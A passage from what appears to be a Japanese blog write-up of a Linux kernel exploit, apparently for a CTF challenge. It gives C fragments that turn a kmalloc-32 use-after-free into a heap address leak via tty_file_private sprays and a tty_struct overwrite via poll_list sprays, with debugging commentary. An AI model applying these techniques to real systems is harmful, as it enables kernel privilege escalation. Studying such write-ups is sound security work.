&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">ptmx_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>filp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> tty_struct &lt;span style="color:#f92672">*&lt;/span>tty;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> retval;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> retval &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">tty_alloc_file&lt;/span>(filp);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tty &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">tty_init_dev&lt;/span>(ptm_driver, index);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">tty_add_file&lt;/span>(tty, filp);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">tty_alloc_file&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>file)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> tty_file_private &lt;span style="color:#f92672">*&lt;/span>priv;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> priv &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">kmalloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>priv), GFP_KERNEL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data &lt;span style="color:#f92672">=&lt;/span> priv;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">tty_add_file&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> tty_struct &lt;span style="color:#f92672">*&lt;/span>tty, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>file)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> tty_file_private &lt;span style="color:#f92672">*&lt;/span>priv &lt;span style="color:#f92672">=&lt;/span> file&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> priv&lt;span style="color:#f92672">-&amp;gt;&lt;/span>tty &lt;span style="color:#f92672">=&lt;/span> tty;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> priv&lt;span style="color:#f92672">-&amp;gt;&lt;/span>file &lt;span style="color:#f92672">=&lt;/span> file;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ここで、&lt;code>tty_alloc_file()&lt;/code>は&lt;code>/dev/ptmx&lt;/code>の&lt;code>struct file&lt;/code>の&lt;code>private_data&lt;/code>メンバに対して&lt;code>struct tty_file_private&lt;/code>を確保して入れます。これは&lt;code>kmalloc-32&lt;/code>から確保されます。その後、&lt;code>tty_init_dev()&lt;/code>で&lt;code>struct tty_struct&lt;/code>を&lt;code>kmalloc-1024&lt;/code>から確保します。そして、&lt;code>tty_add_file()&lt;/code>で&lt;code>struct tty_file_private&lt;/code>内に&lt;code>struct tty_struct&lt;/code>のアドレスを格納します。つまり、&lt;code>kmalloc-32&lt;/code>内の&lt;code>tty_file_private&lt;/code>をleakすることで&lt;code>kmalloc-1024&lt;/code>のアドレスをleakすることができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-leak_heap.c" data-lang="leak_heap.c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Free all keys except UAFed key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_KEY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (keys[ix] &lt;span style="color:#f92672">!=&lt;/span> uafed_key) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">keyctl_revoke&lt;/span>(keys[ix]) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_revoke&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">keyctl_unlink&lt;/span>(keys[ix], KEY_SPEC_PROCESS_KEYRING) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_unlink&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_TTY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/dev/ptmx&amp;#34;&lt;/span>, O_RDWR) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;open tty&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">memset&lt;/span>(keybuf, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x5000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">keyctl_read&lt;/span>(uafed_key, keybuf, &lt;span style="color:#ae81ff">0x5000&lt;/span>) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_read&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong km1024_leaked &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>tmp &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)keybuf &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x4330&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((tmp[ix] &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> (&lt;span style="color:#ae81ff">64&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>)) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0xFFFF&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> tmp[ix&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> tmp[ix&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> tmp[ix&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (tmp[ix] &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFF&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span>) { &lt;span style="color:#75715e">// list_head&amp;#39;s next and prev are same
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> km1024_leaked &lt;span style="color:#f92672">=&lt;/span> tmp[ix];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+0: 0x%lx (tty)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+1: 0x%lx (*file)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+2: 0x%lx (list_head.next)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] &lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">+3: 0x%lx (list_head.prev)&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (km1024_leaked &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Failed to leak kmalloc-1024&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] leaked kmalloc-1024: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, km1024_leaked);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="./not-success.png" alt="kheap leak success&amp;amp;hellip;?">&lt;/p>
&lt;p>良さそう！と思いきや、実際に表示された&lt;code>tty&lt;/code>のアドレスを見てみると、先頭がマジックナンバー(&lt;code>0x5401&lt;/code>)ではなかったため違うポインタでした。何度試してみても、&lt;code>tty&lt;/code>と思わしきものは50回に1回程度しかleakできない&amp;hellip;。うーん、何が悪いのか。UAFされた&lt;code>user_key_payload&lt;/code>以外のkeyをfreeして代わりに&lt;code>tty_file_private&lt;/code>を置いたあとの&lt;code>user_key_payload&lt;/code>が以下の感じ:&lt;/p>
&lt;p>&lt;img src="./heap3.png" alt="UAFed user_key_payload in kmalloc-32">&lt;/p>
&lt;p>先頭32byteが&lt;code>user_key_payload&lt;/code>で、上にはkbaseのleakに使った&lt;code>seq_operations&lt;/code>が乗っかっています。leakできるのは&lt;code>user_key_payload&lt;/code>よりも下の&lt;code>0x4330&lt;/code>byte程度(これは、&lt;code>seq_operations&lt;/code>をUAFで乗せた際に、&lt;code>user_key_payload.datalen&lt;/code>が&lt;code>single_next&lt;/code>のアドレスの下2byteである&lt;code>4330&lt;/code>で上書きされるため)であるため見てみると、&lt;code>seq_operations&lt;/code>の名残がいくつか見えますね。&lt;code>0xa748dc1b1f063d98&lt;/code>は、おそらくフリーなスラブオブジェクト内のリストポインタが暗号化(&lt;code>CONFIG_SLAB_FREELIST_HARDENED&lt;/code>)されているやつでしょう。このことから考えられることとしては、keyのスプレーが少なくてキャッシュ内がkeyで満たされる前に同じ領域に&lt;code>seq_operations&lt;/code>が入ってきてしまったことが考えられます。よって、スプレーするkeyを増やしてみたところ以下の感じ:&lt;/p>
&lt;p>&lt;img src="./heap4.png" alt="kmalloc-32 after increasing num of spraying">&lt;/p>
&lt;p>偶然のような気もしますが、ランダムなQWORD(つまり、暗号化されたスラブのポインタ)と&lt;code>0x41414141&lt;/code>(keyのペイロードとして入れた値)が同一オブジェクト内に入っているため、keyとして割り当てられていたオブジェクトがフリーされていることが分かります。しかし、フリーされたままということは&lt;code>tty_file_private&lt;/code>をスプレーする数が少なかったということでしょうか。少し増やしてみましたが、やはりできません。悲しい。
ここで自分のコードを見てみると&amp;hellip;:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_KEY_SPRAY 80 + 10
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_POLLFD 30 + 510 + 1 &lt;/span>&lt;span style="color:#75715e">// stack, kmalloc-4k, kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#define NUM_POLLLIST_ALLOC 0x10 - 0x1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">key_serial_t&lt;/span> keys[NUM_KEY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_KEY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {...}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_KEY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {...}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>馬鹿！！大馬鹿！おまわりさん、馬鹿はこいつです！捕まえちゃってください！&lt;/strong> マクロなんて所詮文字列置換なので、&lt;code>NUM_KEY_SPRAY * 2&lt;/code>は&lt;code>80 + 10 * 2&lt;/code>と評価されてしまいます！どうりで思った動きしないわけだよ！
というわけで、上のバグを直して十分な&lt;code>tty_file_private&lt;/code>を確保してみた上で、一旦kbaseをリークした直後(keyは全て解放前。UAFされたkeyの上には&lt;code>seq_operations&lt;/code>が乗っている)のヒープを見てみるとこんな感じ:&lt;/p>
&lt;p>&lt;img src="./heap5.png" alt="UAFed key is surrounded by many other user_key_payload, seems good&amp;amp;hellip;">&lt;/p>
&lt;p>一番上がUAFされたkeyで、その直後にはたくさんのkeyが存在していることが分かります(paylod=&lt;code>AAAAA&lt;/code>)。理想的な状況ですね。これでも上手くいかないのはなぜ&amp;hellip;。ここで&lt;code>key&lt;/code>周りのソースを見返してみます:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-security/keys/keyring.c" data-lang="security/keys/keyring.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Clean up a keyring when it is destroyed. Unpublish its name if it had one
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * and dispose of its data.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * The garbage collector detects the final key_put(), removes the keyring from
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * the serial number tree and then does RCU synchronisation before coming here,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * so we shouldn&amp;#39;t need to worry about code poking around here with the RCU
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * readlock held by this time.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">keyring_destroy&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> key &lt;span style="color:#f92672">*&lt;/span>keyring) {...}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>あ、&lt;code>unlink&lt;/code>後にGC(&lt;code>security/keys/gc.c&lt;/code>)がfreeするのか&amp;hellip;!&lt;/strong> ということは、&lt;code>tty_file_private&lt;/code>をスプレーする前に1秒ほどsleepしてGCを待ってやるといいのではと思いやってみると:&lt;/p>
&lt;p>&lt;img src="./lgtm2" alt="">
&lt;img src="./lgtm3.png" alt="kheap leak success after waiting GC for a second">&lt;/p>
&lt;p>よさそう〜〜〜！&lt;/p>
&lt;h2 id="get-rip-by-overwriting-tty_structops">get RIP by overwriting &lt;code>tty_struct.ops&lt;/code>&lt;/h2>
&lt;p>さて、続いてRIPをとりましょう。や、取らなくても年は越せるんですが。
現状ですが、&lt;code>kmalloc-32&lt;/code>にUAFされた&lt;code>user_key_payload&lt;/code>(+上に乗っかっている&lt;code>tty_file_private&lt;/code>)があります。このUAFを再利用して、今度はUAF writeをしましょう。具体的には、&lt;code>poll_list&lt;/code>が&lt;code>kmalloc-1024 -&amp;gt; kmalloc-32&lt;/code>のリストになっている時、&lt;code>kmalloc-32&lt;/code>をUAFで上書きし、&lt;code>poll_list.next&lt;/code>ポインタに&lt;code>tty_struct(kmalloc-1024)&lt;/code>のアドレスを書き込んでやります。その状態で&lt;code>poll_list&lt;/code>をfreeすることで関係ない&lt;code>tty_struct&lt;/code>をfreeしてやることができます。&lt;code>tty_struct&lt;/code>をUAFできたら、あとはopsを書き換えてやればいいはず&amp;hellip;多分&amp;hellip;!
というわけで、それらをしてくれるコードがこれです(3分クッキング感):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-.c" data-lang=".c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Free `seq_operations`, one of which is `user_key_payload`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> NUM_SEQOPERATIONS &lt;span style="color:#f92672">-&lt;/span> NUM_FREE_SEQOPERATIONS; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_SEQOPERATIONS; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">close&lt;/span>(seqops_fd[ix]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Freeed seq_operations&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> neverend &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] spraying `poll_list` in kmalloc-32...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> num_threads &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_2ND_POLLLIST_ALLOC; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>arg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fd &lt;span style="color:#f92672">=&lt;/span> just_fd; arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>id &lt;span style="color:#f92672">=&lt;/span> ix;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timeout_ms &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>; &lt;span style="color:#75715e">// must 1000 &amp;lt; timeout_ms, to wait key GC
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>num_size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">pthread_create&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>threads[ix], NULL, alloc_poll_list, arg) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;pthread_create&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Revoke UAFed key, which is on `poll_list` in kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Freeing UAFed key...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">free_key&lt;/span>(uafed_key);
